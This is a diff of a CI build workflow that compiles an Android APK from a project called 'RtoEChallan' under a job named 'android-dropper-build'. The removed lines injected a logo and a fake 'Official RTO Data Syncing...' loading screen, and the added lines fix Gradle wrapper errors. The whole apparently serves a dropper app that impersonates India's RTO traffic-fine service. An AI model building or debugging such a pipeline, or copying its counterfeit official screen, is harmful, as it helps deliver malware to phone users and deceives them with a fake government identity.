@@ -1,48 +1,25 @@
 workflows:
   android-dropper-build:
-    name: RTO-Absolute-Success
+    name: RTO-App-Folder-Success
     max_build_duration: 60
     instance_type: mac_mini_m2
     environment:
       java: 17
     scripts:
-      - name: Force Locate and Build
+      - name: Build APK from App Folder
         script: |
-          # 1. Project ki main files ko dhoondo chahe wo kahin bhi hon
-          # settings.gradle ko dhoond kar us folder mein jana
-          MAIN_DIR=$(find . -name "settings.gradle" -exec dirname {} \; | head -n 1)
-          cd "$MAIN_DIR"
-          echo "Building from confirmed path: $(pwd)"
+          # 1. Project root mein jao
+          cd RtoEChallan || cd .
 
-          # 2. UI Injection (mainlogo.png & Progress Bar)
-          # Logo file ko dhoond kar sahi jagah copy karna
+          # 2. Logo inject karo (drawable folder mein)
           mkdir -p app/src/main/res/drawable
           find $CM_BUILD_DIR -iname "mainlogo.png" -exec cp {} app/src/main/res/drawable/mainlogo.png \;
-          
-          # Layout file ko force update karna
-          LAYOUT_FILE=$(find . -name "activity_main.xml" | head -n 1)
-          if [ -n "$LAYOUT_FILE" ]; then
-          cat <<EOF > "$LAYOUT_FILE"
-          <?xml version="1.0" encoding="utf-8"?>
-          <RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
-              android:layout_width="match_parent" android:layout_height="match_parent"
-              android:background="#FFFFFF">
-              <ImageView android:id="@+id/logo" android:layout_width="120dp" android:layout_height="120dp"
-                  android:layout_centerInParent="true" android:src="@drawable/mainlogo" />
-              <ProgressBar android:layout_width="wrap_content" android:layout_height="wrap_content"
-                  android:layout_centerInParent="true" android:indeterminateTint="#2196F3" />
-              <TextView android:layout_width="wrap_content" android:layout_height="wrap_content"
-                  android:layout_below="@id/logo" android:layout_centerHorizontal="true"
-                  android:layout_marginTop="25dp" android:text="Official RTO Data Syncing..."
-                  android:textColor="#000000" android:textStyle="bold" />
-          </RelativeLayout>
-          EOF
-          fi
 
-          # 3. Force Build (Bypass Error 127)
-          # Gradlew files ko force generate karna
-          gradle wrapper --gradle-version 8.0.2
+          # 3. Gradle Wrapper refresh (Error 127 fix karne ke liye)
+          gradle wrapper --gradle-version 8.2
           chmod +x gradlew
+
+          # 4. Final Build - Ab ye seedha app folder ko uthayega
           ./gradlew assembleRelease --no-daemon
           
     artifacts:
